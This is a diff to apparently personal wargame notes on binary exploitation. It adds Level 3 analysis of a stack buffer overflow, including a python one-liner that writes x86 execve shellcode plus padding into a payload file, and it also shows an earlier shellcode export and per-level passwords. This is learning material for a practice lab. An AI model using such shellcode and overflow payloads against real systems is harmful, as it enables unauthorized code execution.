@@ -104,10 +104,21 @@ export EGG=$(python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\
 ```
 He used https://www.exploit-db.com/exploits/44594 for the byte array.<br>
 The new idea for solving this level is `shellcoding`, for further info see `pwn.md`.
+## Level 3
+### analys
+- stdlib -> system(), check random stack (0xf7e4c850, )
+Generate random string 
+```py
+import pyperclip, random
+pyperclip.copy(''.join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(1000)))
+```
+- doesn't work, struct.pack("I", 0xf7e84b09)
+- run the ip pointer that way at the end of main we can execute buff
+- `python3 -c "print('\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80'+ 'a'*(132-49)+'buff')" > /tmp/x`
 ### Passwords
 level
-- 0 -> `efeidiedae` : no time + help
-- 0 -> `nairiepecu` : no time + help
+- 1 -> `efeidiedae` : no time + help
+- 2 -> `nairiepecu` : no time + help
 
 
 
